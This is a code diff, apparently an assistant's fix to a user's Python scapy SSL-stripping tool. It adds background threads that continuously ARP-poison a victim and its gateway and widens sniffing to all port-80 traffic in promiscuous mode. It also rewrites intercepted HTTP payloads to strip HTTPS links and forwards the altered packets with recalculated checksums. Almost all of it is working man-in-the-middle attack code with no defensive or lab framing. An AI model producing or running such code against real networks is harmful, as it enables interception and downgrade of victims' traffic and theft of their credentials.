@@ -3,6 +3,9 @@ from typing import Optional
 import scapy.all as scapy
 import re
 import sys
+import threading # Add this at the top
+from arp_poison import grat_arp_poison # Assuming your file is named arp_poison.py
+import time
 
 @dataclass
 class SSLStripConfig:
@@ -49,6 +52,7 @@ def run_ssl_strip(config: SSLStripConfig) -> None:
         print("[-] Error: Victim IP and Gateway IP are required.")
         return
 
+    # 1. Resolve MAC addresses
     arp_db = load_arp_watcher_db()
     print("[*] Resolving MAC addresses...")
     victim_mac = get_mac(config.victim_ip, config.iface, arp_db)
@@ -61,17 +65,43 @@ def run_ssl_strip(config: SSLStripConfig) -> None:
 
     print(f"[*] Resolved: Victim={victim_mac}, Gateway={gateway_mac}")
 
+    # 2. START ARP SPOOFING IN BACKGROUND THREADS
+    # We need two threads: one to fool the Victim, one to fool the Gateway
+    print("[*] Initializing ARP Poisoning threads...")
+    
+    def spoof_victim():
+        # Tell Victim (victim_ip) that Gateway (gateway_ip) is at My MAC
+        # We use op=2 (is-at/reply) to keep the cache poisoned
+        pkt = scapy.Ether(dst=victim_mac)/scapy.ARP(op=2, pdst=config.victim_ip, psrc=config.gateway_ip)
+        while True:
+            scapy.sendp(pkt, iface=config.iface, verbose=False)
+            time.sleep(2)
+
+    def spoof_gateway():
+        # Tell Gateway (gateway_ip) that Victim (victim_ip) is at My MAC
+        pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=config.gateway_ip, psrc=config.victim_ip)
+        while True:
+            scapy.sendp(pkt, iface=config.iface, verbose=False)
+            time.sleep(2)
+
+    # Launch the threads as 'daemon' so they exit when the main script stops
+    threading.Thread(target=spoof_victim, daemon=True).start()
+    threading.Thread(target=spoof_gateway, daemon=True).start()
+
     start_intercept(config)
     
-    # Filter for TCP traffic on port 80 involving our target
-    bpf_filter = f"tcp port 80 and (host {config.victim_ip} or host {config.gateway_ip})"
+    # 3. START SNIFFER
+    # We broaden the filter to "tcp port 80" to ensure we catch both directions
+    bpf_filter = "tcp port 80"
     
     try:
+        print("[*] Sniffer active. Monitoring for HTTPS links...")
         scapy.sniff(
             iface=config.iface,
             filter=bpf_filter,
             prn=lambda pkt: process_packet(pkt, config, victim_mac, gateway_mac, my_mac),
-            store=0
+            store=0,
+            promisc=True # Ensures the card stays in promiscuous mode
         )
     except KeyboardInterrupt:
         pass
@@ -95,7 +125,7 @@ def process_packet(pkt, config: SSLStripConfig, victim_mac: str, gateway_mac: st
     if not pkt.haslayer(scapy.IP) or not pkt.haslayer(scapy.Ether):
         return
 
-    # Avoid processing our own injected packets
+    # Avoid processing our own injected packets (the ones we just sent)
     if pkt[scapy.Ether].src == my_mac:
         return
 
@@ -104,31 +134,43 @@ def process_packet(pkt, config: SSLStripConfig, victim_mac: str, gateway_mac: st
     if pkt[scapy.IP].src == config.victim_ip:
         target_mac = gateway_mac
     elif pkt[scapy.IP].src == config.gateway_ip:
+        # This is the direction we care about for STRIPPING (Gateway -> Victim)
         target_mac = victim_mac
     else:
+        # Ignore packets that aren't from our target IPs
         return
 
-    # Modify Payload if HTTP
+    # Modify Payload if it contains Data (Raw layer)
     if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
         payload = pkt[scapy.Raw].load
-    
-        # Check if it's HTTP traffic
-        if any(m in payload for m in [b"GET ", b"POST ", b"PUT ", b"DELETE ", b"HEAD ", b"HTTP/1."]):
-            modified_payload = rewrite_http_payload(payload)
+        
+        # DEBUG: Let's see every data packet passing through
+        print(f"[*] Intercepted {len(payload)} bytes from {pkt[scapy.IP].src}")
+
+        # LOGIC FIX: Instead of checking for "GET/POST", we check for our TARGET STRINGS
+        # because the Gateway's response might be split across multiple packets.
+        modified_payload = rewrite_http_payload(payload)
+        
+        if modified_payload != payload:
+            print(f"[+] SUCCESS: Modified packet content from {pkt[scapy.IP].src}!")
+            print(f"    Summary: {pkt.summary()}")
             
-            if modified_payload != payload:
-                print(f"[+] Stripped SSL from packet: {pkt.summary()}")
-                pkt[scapy.Raw].load = modified_payload
-                # Recalculate checksums so the packet is valid
+            pkt[scapy.Raw].load = modified_payload
+            
+            # Recalculate checksums so the receiver doesn't drop the "corrupted" packet
+            # Scapy recalculates these automatically when you 'del' the old ones.
+            if scapy.IP in pkt:
                 del pkt[scapy.IP].len
                 del pkt[scapy.IP].chksum
+            if scapy.TCP in pkt:
                 del pkt[scapy.TCP].chksum
 
-    # Forward the packet
+    # Forward the packet to the actual destination
     pkt[scapy.Ether].dst = target_mac
     pkt[scapy.Ether].src = my_mac
     
     try:
+        # sendp sends at Layer 2 (Ethernet)
         scapy.sendp(pkt, iface=config.iface, verbose=False)
     except Exception as e:
         print(f"[-] Error forwarding packet: {e}")
